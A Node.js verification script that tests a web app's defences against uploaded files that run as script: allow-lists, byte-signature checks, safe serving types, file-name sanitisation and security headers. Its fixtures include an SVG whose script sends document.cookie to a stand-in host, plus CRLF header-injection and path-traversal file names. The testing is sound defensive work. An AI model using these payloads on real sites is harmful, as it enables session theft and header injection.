/**
 * Verifies the defences around stored files.
 *
 * The threat being tested: a user uploads a file that a browser will execute
 * as script, receives a URL on this origin, and gets another signed-in user
 * to open it. Three layers must independently stop that.
 *
 * Runs on plain node using the same TypeScript hook as the other verify
 * scripts, so it needs no test runner.
 */

const fs = require("fs");
const path = require("path");
const Module = require("module");
const ts = require("typescript");

const projectRoot = path.join(__dirname, "..");

// Allow `require` of .ts sources.
require.extensions[".ts"] = function compileTypeScript(module, filename) {
  const source = fs.readFileSync(filename, "utf8");
  const { outputText } = ts.transpileModule(source, {
    compilerOptions: {
      module: ts.ModuleKind.CommonJS,
      target: ts.ScriptTarget.ES2020,
      esModuleInterop: true,
    },
    fileName: filename,
  });
  return module._compile(outputText, filename);
};

// Resolve the "@/" path alias the application uses.
const originalResolve = Module._resolveFilename;
Module._resolveFilename = function resolveWithAlias(request, ...rest) {
  if (request.startsWith("@/")) {
    return originalResolve.call(
      this,
      path.join(projectRoot, request.slice(2)),
      ...rest,
    );
  }
  return originalResolve.call(this, request, ...rest);
};

const {
  AVATAR_FILE_EXTENSIONS,
  AVATAR_MIME_TYPES,
  DOCUMENT_MIME_TYPES,
  FALLBACK_BINARY_MIME_TYPE,
  detectImageSignature,
  isInlineRenderableMimeType,
  resolveServableMimeType,
  sanitizeDownloadFileName,
} = require("../lib/safe-file-types.ts");

const failures = [];
let assertionCount = 0;

function check(label, actual, expected) {
  assertionCount += 1;
  if (actual !== expected) {
    failures.push(
      `${label}: expected ${JSON.stringify(expected)}, received ${JSON.stringify(actual)}`,
    );
  }
}

// ---------------------------------------------------------------------------
// Layer 1 — the upload allow-list
// ---------------------------------------------------------------------------

// The original bug: `"image/svg+xml".startsWith("image/")` is true.
check(
  "The old prefix test would have accepted SVG",
  "image/svg+xml".startsWith("image/"),
  true,
);
check("SVG is rejected by the avatar allow-list", AVATAR_MIME_TYPES.has("image/svg+xml"), false);

const scriptableTypes = [
  "image/svg+xml",
  "text/html",
  "application/xhtml+xml",
  "application/xml",
  "text/xml",
  "application/javascript",
  "text/javascript",
  "image/svg",
];

for (const mimeType of scriptableTypes) {
  check(`Avatar upload rejects ${mimeType}`, AVATAR_MIME_TYPES.has(mimeType), false);
  check(`Documents reject ${mimeType}`, DOCUMENT_MIME_TYPES.has(mimeType), false);
}

check("Avatar accepts JPEG", AVATAR_MIME_TYPES.has("image/jpeg"), true);
check("Avatar accepts PNG", AVATAR_MIME_TYPES.has("image/png"), true);
check("Avatar accepts WebP", AVATAR_MIME_TYPES.has("image/webp"), true);
check("Avatar does not accept PDF", AVATAR_MIME_TYPES.has("application/pdf"), false);

check("Avatar extensions reject .svg", AVATAR_FILE_EXTENSIONS.has(".svg"), false);
check("Avatar extensions reject .html", AVATAR_FILE_EXTENSIONS.has(".html"), false);
check("Avatar extensions accept .png", AVATAR_FILE_EXTENSIONS.has(".png"), true);

// ---------------------------------------------------------------------------
// Layer 1b — byte signatures, because the type and extension are both faked
// ---------------------------------------------------------------------------

function bytesOf(text) {
  return new Uint8Array(Buffer.from(text, "utf8"));
}

// The real attack file: valid SVG carrying script, renamed and relabelled.
const hostileSvg = bytesOf(
  '<svg xmlns="http://www.w3.org/2000/svg"><script>fetch("//evil.test?c="+document.cookie)</script></svg>',
);
check("A script-bearing SVG has no accepted signature", detectImageSignature(hostileSvg), null);

const svgWithLeadingXmlDeclaration = bytesOf(
  '<?xml version="1.0"?><svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>',
);
check(
  "An SVG behind an XML declaration is still rejected",
  detectImageSignature(svgWithLeadingXmlDeclaration),
  null,
);

const svgWithLeadingWhitespace = bytesOf('   \n\t<svg xmlns="http://www.w3.org/2000/svg"></svg>');
check(
  "Padded SVG cannot slip past the signature check",
  detectImageSignature(svgWithLeadingWhitespace),
  null,
);

check("An HTML document is rejected", detectImageSignature(bytesOf("<!DOCTYPE html><html>")), null);
check("Empty input is rejected", detectImageSignature(new Uint8Array([])), null);
check("Truncated input is rejected", detectImageSignature(new Uint8Array([0xff, 0xd8])), null);

// Genuine files must pass.
const jpegBytes = new Uint8Array([0xff, 0xd8, 0xff, 0xe0, 0x00, 0x10]);
const pngBytes = new Uint8Array([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a, 0x00]);
const webpBytes = new Uint8Array([
  0x52, 0x49, 0x46, 0x46, 0x24, 0x00, 0x00, 0x00, 0x57, 0x45, 0x42, 0x50,
]);
const pdfBytes = bytesOf("%PDF-1.7\n");

check("A real JPEG is detected", detectImageSignature(jpegBytes), "image/jpeg");
check("A real PNG is detected", detectImageSignature(pngBytes), "image/png");
check("A real WebP is detected", detectImageSignature(webpBytes), "image/webp");
check("A real PDF is detected", detectImageSignature(pdfBytes), "application/pdf");

// A PNG signature must not be produced by a near-miss prefix.
check(
  "A near-miss PNG header is rejected",
  detectImageSignature(new Uint8Array([0x89, 0x50, 0x4e, 0x47, 0x00, 0x00, 0x00, 0x00])),
  null,
);
// RIFF that is not WebP (for example a WAV file).
check(
  "RIFF that is not WebP is rejected",
  detectImageSignature(
    new Uint8Array([0x52, 0x49, 0x46, 0x46, 0x24, 0x00, 0x00, 0x00, 0x57, 0x41, 0x56, 0x45]),
  ),
  null,
);

// The full upload rule the action applies: declared type, extension and
// signature must all agree.
function avatarUploadAccepts(declaredType, fileName, bytes) {
  const extension = path.extname(fileName).toLowerCase();
  if (!AVATAR_MIME_TYPES.has(declaredType)) return false;
  if (!AVATAR_FILE_EXTENSIONS.has(extension)) return false;
  const detected = detectImageSignature(bytes);
  if (!detected || !AVATAR_MIME_TYPES.has(detected)) return false;
  return detected === declaredType;
}

check(
  "SVG disguised as PNG by name and type is refused",
  avatarUploadAccepts("image/png", "avatar.png", hostileSvg),
  false,
);
check(
  "SVG sent with its true type is refused",
  avatarUploadAccepts("image/svg+xml", "avatar.svg", hostileSvg),
  false,
);
check(
  "A PDF renamed to .png is refused",
  avatarUploadAccepts("image/png", "avatar.png", pdfBytes),
  false,
);
check(
  "A real PNG labelled as JPEG is refused",
  avatarUploadAccepts("image/jpeg", "avatar.jpg", pngBytes),
  false,
);
check(
  "A genuine PNG upload is accepted",
  avatarUploadAccepts("image/png", "avatar.png", pngBytes),
  true,
);
check(
  "A genuine JPEG upload is accepted",
  avatarUploadAccepts("image/jpeg", "photo.jpeg", jpegBytes),
  true,
);

// ---------------------------------------------------------------------------
// Layer 2 — what the file-serving route is allowed to echo back
// ---------------------------------------------------------------------------

// Even if a hostile row already exists in the database from before the fix,
// the response must not repeat its content type.
check(
  "A stored SVG type is not echoed back",
  resolveServableMimeType("image/svg+xml"),
  FALLBACK_BINARY_MIME_TYPE,
);
check(
  "A stored HTML type is not echoed back",
  resolveServableMimeType("text/html"),
  FALLBACK_BINARY_MIME_TYPE,
);
check(
  "A stored script type is not echoed back",
  resolveServableMimeType("application/javascript"),
  FALLBACK_BINARY_MIME_TYPE,
);
check("A null stored type is safe", resolveServableMimeType(null), FALLBACK_BINARY_MIME_TYPE);
check("An empty stored type is safe", resolveServableMimeType(""), FALLBACK_BINARY_MIME_TYPE);
check(
  "A padded, mixed-case allowed type is normalised",
  resolveServableMimeType("  IMAGE/PNG  "),
  "image/png",
);
check("PNG is served as PNG", resolveServableMimeType("image/png"), "image/png");
check("PDF is served as PDF", resolveServableMimeType("application/pdf"), "application/pdf");

// Disposition: only bitmaps render inline.
check("PNG renders inline", isInlineRenderableMimeType("image/png"), true);
check("JPEG renders inline", isInlineRenderableMimeType("image/jpeg"), true);
check("WebP renders inline", isInlineRenderableMimeType("image/webp"), true);
check("PDF is not rendered inline", isInlineRenderableMimeType("application/pdf"), false);
check("SVG is never rendered inline", isInlineRenderableMimeType("image/svg+xml"), false);
check(
  "An opaque binary is not rendered inline",
  isInlineRenderableMimeType(FALLBACK_BINARY_MIME_TYPE),
  false,
);

// The end-to-end serving decision for a pre-existing hostile row.
const servedType = resolveServableMimeType("image/svg+xml");
check("A legacy hostile row downloads instead of rendering", isInlineRenderableMimeType(servedType), false);

// Header injection through the stored file name.
check(
  "A quote in the file name cannot break the header",
  sanitizeDownloadFileName('evil".svg'),
  "evil_.svg",
);
// The colon and equals sign are outside the permitted character set, so they
// are replaced too. What matters is that no CR or LF survives.
const crlfSanitized = sanitizeDownloadFileName("a\r\nSet-Cookie: x=1");
check("CR is stripped from the file name", crlfSanitized.includes("\r"), false);
check("LF is stripped from the file name", crlfSanitized.includes("\n"), false);
check("A header cannot be injected via the file name", crlfSanitized, "a__Set-Cookie_ x_1");
check(
  "A directory traversal name is reduced to its base",
  sanitizeDownloadFileName("../../etc/passwd"),
  "passwd",
);
check(
  "A Windows path is reduced to its base",
  sanitizeDownloadFileName("C:\\Users\\a\\salary.pdf"),
  "salary.pdf",
);
check("An empty file name has a fallback", sanitizeDownloadFileName(""), "file");
check("An ordinary name survives", sanitizeDownloadFileName("Salary Certificate.pdf"), "Salary Certificate.pdf");
check("A long name is truncated", sanitizeDownloadFileName("a".repeat(500)).length, 120);

// ---------------------------------------------------------------------------
// Layer 3 — the headers actually configured
// ---------------------------------------------------------------------------

const documentsRouteSource = fs.readFileSync(
  path.join(projectRoot, "app/api/documents/[id]/route.ts"),
  "utf8",
);
check(
  "The documents route sends nosniff",
  documentsRouteSource.includes('"X-Content-Type-Options": "nosniff"'),
  true,
);
check(
  "The documents route sends its own CSP",
  documentsRouteSource.includes('"Content-Security-Policy"'),
  true,
);
check(
  "The documents route no longer echoes the stored mime type",
  documentsRouteSource.includes('"Content-Type": document.mimeType'),
  false,
);

const packetsRouteSource = fs.readFileSync(
  path.join(projectRoot, "app/api/packets/[id]/route.ts"),
  "utf8",
);
check(
  "The packets route sends nosniff",
  packetsRouteSource.includes('"X-Content-Type-Options": "nosniff"'),
  true,
);

const nextConfigSource = fs.readFileSync(path.join(projectRoot, "next.config.mjs"), "utf8");
for (const header of [
  "X-Content-Type-Options",
  "X-Frame-Options",
  "Referrer-Policy",
  "Permissions-Policy",
  "Content-Security-Policy",
]) {
  check(`next.config sets ${header}`, nextConfigSource.includes(header), true);
}
check("next.config defines a headers function", nextConfigSource.includes("async headers()"), true);
check("object-src is locked down", nextConfigSource.includes("object-src 'none'"), true);
check("frame-ancestors is locked down", nextConfigSource.includes("frame-ancestors 'none'"), true);
check("base-uri is locked down", nextConfigSource.includes("base-uri 'self'"), true);
check("The framework version is hidden", nextConfigSource.includes("poweredByHeader: false"), true);

// The upload action must no longer contain the permissive prefix test.
const userActionSource = fs.readFileSync(path.join(projectRoot, "app/actions/user.ts"), "utf8");

// The phrase still appears in the comment explaining why it was removed, so
// only executable lines are examined.
const userActionCode = userActionSource
  .split("\n")
  .filter((line) => !line.trim().startsWith("//") && !line.trim().startsWith("*"))
  .join("\n");

check(
  "The permissive image/ prefix test is gone from executable code",
  userActionCode.includes('file.type.startsWith("image/")'),
  false,
);
check(
  "The removal is documented for the next reader",
  userActionSource.includes("image/svg+xml"),
  true,
);
check(
  "The avatar action verifies byte signatures",
  userActionSource.includes("detectImageSignature"),
  true,
);
check(
  "The avatar action stores the detected type",
  userActionSource.includes("mimeType: detectedMimeType"),
  true,
);

if (failures.length > 0) {
  console.error("Upload safety checks FAILED:\n");
  for (const failure of failures) console.error(`  - ${failure}`);
  process.exit(1);
}

console.log("Upload safety checks passed.");
console.log(
  JSON.stringify(
    {
      assertionCount,
      avatarMimeTypes: [...AVATAR_MIME_TYPES],
      documentMimeTypes: [...DOCUMENT_MIME_TYPES],
      inlineRenderable: ["image/jpeg", "image/png", "image/webp"],
      everythingElse: "served as an attachment with nosniff and a sandbox CSP",
    },
    null,
    2,
  ),
);
